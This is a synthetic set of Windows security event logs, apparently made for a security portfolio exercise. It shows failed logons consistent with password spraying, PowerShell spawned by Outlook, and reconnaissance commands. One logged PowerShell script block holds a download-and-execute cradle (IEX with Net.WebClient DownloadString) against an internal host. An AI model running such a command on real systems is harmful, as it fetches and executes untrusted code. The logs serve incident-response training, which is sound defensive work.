# Synthetic Raw Logs

> All data in this file is synthetic and created specifically for this portfolio exercise.

## Initial workstation events

```text
[Event 1]
Time:        2026-07-31 21:14:02
Event ID:    4625
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Status:      0xC000006D
Substatus:   0xC000006A
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 2]
Time:        2026-07-31 21:14:08
Event ID:    4625
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Status:      0xC000006D
Substatus:   0xC000006A
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 3]
Time:        2026-07-31 21:14:15
Event ID:    4625
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Status:      0xC000006D
Substatus:   0xC000006A
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 4]
Time:        2026-07-31 21:14:22
Event ID:    4625
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Status:      0xC000006D
Substatus:   0xC000006A
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 5]
Time:        2026-07-31 21:14:29
Event ID:    4625
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Status:      0xC000006D
Substatus:   0xC000006A
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 6]
Time:        2026-07-31 21:14:36
Event ID:    4625
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Status:      0xC000006D
Substatus:   0xC000006A
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 7]
Time:        2026-07-31 21:14:43
Event ID:    4625
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Status:      0xC000006D
Substatus:   0xC000006A
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 8]
Time:        2026-07-31 21:15:01
Event ID:    4624
Logon Type:  3
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Workstation: RG-LAPTOP-12
Authentication Package: NTLM

[Event 9]
Time:        2026-07-31 21:18:44
Event ID:    4624
Logon Type:  2
Account:     j.smith
Domain:      REDGUM
Source IP:   -
Workstation: RG-ACCT-07
Authentication Package: Negotiate
```

## Domain controller correlation

```text
[Event 10]
Time:        2026-07-31 21:13:58
Event ID:    4625
Account:     a.wilson
Domain:      REDGUM
Source IP:   192.168.1.44
Logon Type:  3
Status:      0xC000006D
Substatus:   0xC000006A

[Event 11]
Time:        2026-07-31 21:14:01
Event ID:    4625
Account:     m.chen
Domain:      REDGUM
Source IP:   192.168.1.44
Logon Type:  3
Status:      0xC000006D
Substatus:   0xC000006A

[Event 12]
Time:        2026-07-31 21:14:02
Event ID:    4625
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Logon Type:  3
Status:      0xC000006D
Substatus:   0xC000006A

[Event 13]
Time:        2026-07-31 21:14:05
Event ID:    4625
Account:     r.brown
Domain:      REDGUM
Source IP:   192.168.1.44
Logon Type:  3
Status:      0xC000006D
Substatus:   0xC000006A

[Event 14]
Time:        2026-07-31 21:14:08
Event ID:    4625
Account:     j.smith
Domain:      REDGUM
Source IP:   192.168.1.44
Logon Type:  3
Status:      0xC000006D
Substatus:   0xC000006A

[Event 15]
Time:        2026-07-31 21:14:11
Event ID:    4625
Account:     s.patel
Domain:      REDGUM
Source IP:   192.168.1.44
Logon Type:  3
Status:      0xC000006D
Substatus:   0xC000006A

[Event 16]
Time:        2026-07-31 21:14:15
Event ID:    4624
Account:     r.brown
Domain:      REDGUM
Source IP:   192.168.1.44
Logon Type:  3
Authentication Package: NTLM
```

## Process creation

```text
[Event 17]
Time:        2026-07-31 21:15:32
Event ID:    4688
Host:        RG-LAPTOP-12
Account:     REDGUM\j.smith
Process:     powershell.exe
Parent:      outlook.exe

[Event 18]
Time:        2026-07-31 21:15:41
Event ID:    4688
Host:        RG-LAPTOP-12
Account:     REDGUM\j.smith
Process:     cmd.exe
Parent:      powershell.exe

[Event 19]
Time:        2026-07-31 21:16:03
Event ID:    4688
Host:        RG-LAPTOP-12
Account:     REDGUM\j.smith
Process:     whoami.exe
Parent:      cmd.exe
```

## PowerShell Script Block Logging

```text
[Event 20]
Event ID:    4104
Time:        2026-07-31 21:15:34
User:        REDGUM\j.smith
Host:        RG-LAPTOP-12

ScriptBlockText:

$u = "http://10.10.20.15/update.ps1"
IEX (New-Object Net.WebClient).DownloadString($u)
```

```text
[Event 21]
Event ID:    4104
Time:        2026-07-31 21:15:39
User:        REDGUM\j.smith
Host:        RG-LAPTOP-12

ScriptBlockText:

Get-Process
Get-Service
whoami /all
```

## Client-confirmed context

```text
192.168.1.44 = RG-LAPTOP-12
Assigned user = John Smith

John Smith confirmed he was not using the laptop at 21:14–21:16.
The laptop was physically located in the office.
```
